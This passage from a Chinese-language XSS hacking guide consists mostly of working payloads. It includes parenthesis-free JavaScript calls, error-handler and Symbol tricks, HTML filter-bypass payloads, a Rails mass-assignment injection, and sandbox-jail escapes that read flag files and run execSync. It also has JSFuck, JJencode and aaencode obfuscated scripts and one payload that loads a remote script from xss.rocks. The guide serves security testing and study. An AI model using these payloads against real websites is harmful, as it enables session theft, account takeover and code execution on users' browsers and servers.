Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意函数 (alert) 调用**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM 漏洞**

有 **JS code** 使用 **由攻击者控制的不安全数据**，例如 `location.href`。攻击者可以滥用它来执行任意 JS 代码。\
**由于关于** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**的说明较长，已迁移到此页：**


{{#ref}}
dom-xss.md
{{#endref}}

在那里你会找到关于 **DOM vulnerabilities 是什么、如何被触发以及如何利用它们** 的详细解释。\
另外，不要忘记在上述文章的末尾，你可以找到关于 [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) 的解释。

### 升级 Self-XSS

### Cookie XSS

如果你可以通过在 cookie 中发送 payload 来触发 XSS，这通常是 self-XSS。然而，如果你发现一个 **vulnerable subdomain to XSS**，你可以滥用该 XSS 在整个域中注入 cookie，从而在主域或其他子域（那些对 cookie XSS 易受影响的子域）触发 cookie XSS。为此你可以使用 cookie tossing attack：


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

你可以在 [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html) 中找到对此技术的精彩滥用示例。

### 将你的会话发送给管理员

可能用户可以与管理员共享他的个人资料，如果 self XSS 存在于用户的个人资料中，而管理员访问该资料，就会触发该漏洞。

### Session Mirroring

如果你发现 self XSS，并且网页对管理员有 **session mirroring for administrators** 功能（例如允许客户请求帮助，为了帮助你，管理员会以自己的会话视角看到你在会话中看到的内容），你就可以让管理员触发你的 self XSS 并窃取他的 cookies/会话。

## 其他绕过方法

### 绕过 sanitization（通过 WASM linear-memory template overwrite）

当 web app 使用 Emscripten/WASM 时，常量字符串（如 HTML 格式的模板）位于可写的 linear memory 中。一次 in‑WASM 溢出（例如编辑路径中未检查的 memcpy）就能破坏相邻结构并将写入重定向到这些常量。将模板如 "<article><p>%.*s</p></article>" 覆盖为 "<img src=1 onerror=%.*s>" 会将已被 sanitization 的输入转为 JavaScript 处理器值，并在渲染时立即产生 DOM XSS。

查看专门页面以获取利用工作流、DevTools memory helpers 和防御措施：


{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Unicode 规范化

你可以检查 **reflected values** 是否在服务器（或客户端）上被 **unicode normalized**，并滥用此功能来绕过防护。 [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

由于 **RoR mass assignment**，引号被插入到 HTML 中，因此引号限制被绕过，可以在标签内部添加附加字段（onfocus）。\

表单示例 ([from this report](https://hackerone.com/reports/709336))，如果你发送 payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
键值对 "Key","Value" 将被回显如下：
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
然后，将插入 onfocus 属性，发生 XSS。

### 特殊组合
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### 在 302 response 中通过 header 注入实现 XSS

如果你发现可以 **inject headers in a 302 Redirect response**，你可以尝试 **make the browser execute arbitrary JavaScript**。这并不简单，因为现代浏览器在 HTTP 响应状态码为 302 时不会解释响应体，所以仅仅放置一个 cross-site scripting payload 是无效的。

在 [**this report**](https://www.gremwell.com/firefox-xss-302) 和 [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) 中，你可以了解如何在 Location header 中测试多种协议，并查看是否有协议允许浏览器检查并执行响应体内的 XSS payload。\
已知的协议包括：`mailto://`、`//x:1/`、`ws://`、`wss://`、_empty Location header_、`resource://`。

### 仅字母、数字和点

如果你能够指定 JavaScript 将要 **execute** 的 **callback**，且该值仅限这些字符的集合，[**阅读本帖的这一节**](#javascript-function) 以了解如何滥用此行为。

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 如果你尝试加载 content-type 为 `application/octet-stream` 的 script，Chrome 会抛出以下错误：

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

唯一能让 Chrome 执行已加载脚本的 **Content-Type** 是定义在 const **`kSupportedJavascriptTypes`** 中的那些，参见 [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### 可导致 XSS 的 Script 类型

(来自 [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 那么，哪些 type 可以用来加载脚本？
```html
<script type="???"></script>
```
答案是：

- **module** (默认，无需说明)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles 是一个功能，允许你将一组数据（HTML、CSS、JS…）打包到一个 **`.wbn`** 文件中。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** 允许改进 import 语法
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
这个行为在 [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) 中被用来将一个 library 重新映射为 eval；滥用该方法可以触发 XSS。

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** 该功能主要用于解决由预渲染引起的一些问题。其工作方式如下：
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types 导致 XSS

(来自 [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 下列 Content-Types 可以在所有浏览器中执行 XSS：

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

在其他浏览器中，其他 **`Content-Types`** 也可以用来执行任意 JS，参见: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml 内容类型

如果页面返回 text/xml content-type，可以指定命名空间并执行任意 JS：
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特殊替换模式

当使用类似 **`"some {{template}} data".replace("{{template}}", <user_input>)`** 的写法时，攻击者可以使用 [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) 来尝试绕过某些防护： `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

例如在 [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) 中，这被用来在脚本内部**转义 JSON 字符串**并执行任意代码。

### Chrome 缓存导致 XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

如果你只有有限的可用字符集，查看这些针对 XSJail 问题的其他有效解决方案：
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
如果在执行不受信任的代码之前**everything is undefined**（比如在 [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves) 中），就有可能“凭空”生成有用的对象来滥用任意不受信任代码的执行：

- 使用 import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- 间接访问 `require`

[根据这个](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) 模块会被 Node.js 包装在一个函数中，如下：
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
因此，如果我们可以从该模块**调用另一个函数**，就可以在该函数中使用 `arguments.callee.caller.arguments[1]` 来访问 **`require`**：
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
与前一个示例类似，可以通过**使用错误处理程序**访问模块的**包装器**并获取**`require`**函数：
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### 混淆与高级绕过

- **同一页面的多种混淆:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- 更高级的 JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS 常见 payloads

